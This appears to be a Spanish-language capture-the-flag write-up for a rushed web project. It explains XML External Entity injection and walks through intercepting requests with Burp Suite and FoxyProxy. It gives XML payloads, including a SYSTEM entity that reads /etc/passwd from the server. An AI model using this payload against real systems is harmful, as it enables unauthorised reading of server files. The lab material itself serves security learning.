mado## Descripción
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? Additional details will be available after launching your challenge instance.

El proyecto web se hizo con prisa y no se realizó una evaluación de seguridad. ¿Puedes leer el archivo `/etc/passwd`? Los detalles adicionales estarán disponibles después de iniciar tu instancia de desafío.
## Solución
XML External Entity es una vulnerabilidad presente en las aplicaciones que analizan entradas XML. 

Por ejemplo, **si un parser de XML acepta entidades externas** (un tipo de entidad personalizada cuyos valores específicos se cargan desde los archivos DTD en los que están escritos), **un atacante puede intervenir su contenido** para leer archivos del _file system_ o efectuar ataques como un [Server Side Request Forgery (SSRF)](https://blog.hackmetrix.com/ssrf-server-side-request-forgery/), entre otros.

Usando `Burp Suite`y la extensión de navegador `FoxyProxy`podemos realizar este tipo de ataque, esto se hace de la siguiente manera: 
1. Primero conectamos la extensión con `Burp`, en `FoxyProxy` vamos a `opciones > añadir`ponemos un nombre, tipo `HTTP`, como dirección `127.0.0.1`y en puerto `8080`.
2. Vamos a `Burp` en la sección `proxy`, ahí al interactuar con la página veremos las solicitudes `GET`y`POST`, nos importan estas ultimas, damos clic en una y en la zona de `request` veremos información de esta, podemos observar que usan aplicación `XML` por lo que pueden ser vulnerables. Damos clic derecho en la zona y seleccionamos `Sendo to Repeater` y nos movemos a la pestaña `Repeater`.
3. Una vez allí, modificamos el código `XML`dejandolo de la siguiente manera:
```XML
<?xml version="1.0" encoding="UTF-8"?>
<! DOCTYPE foo[
		 <! ENTITY test "XXE VULNERABLE">
]>
<data>
	<ID>
		&test;
	</ID>
</data>
```
``
	Damos a `Send` y en la zona de `Response` debería de aparecer el texto `Invalid ID: XXE VULNERABLE`, esto nos indica que efectivamente la página es vulnerable.
	
4. Ahora utilizamos el siguiente código para observar las contraseñas dentro de la maquina, en la zona de `Response` debería de aparecer la bandera.
```XML
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [
	  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
	<ID>
		&xxe;
	</ID>
</data>
```
## Referencias
https://blog.hackmetrix.com/xxe-xml-external-entity/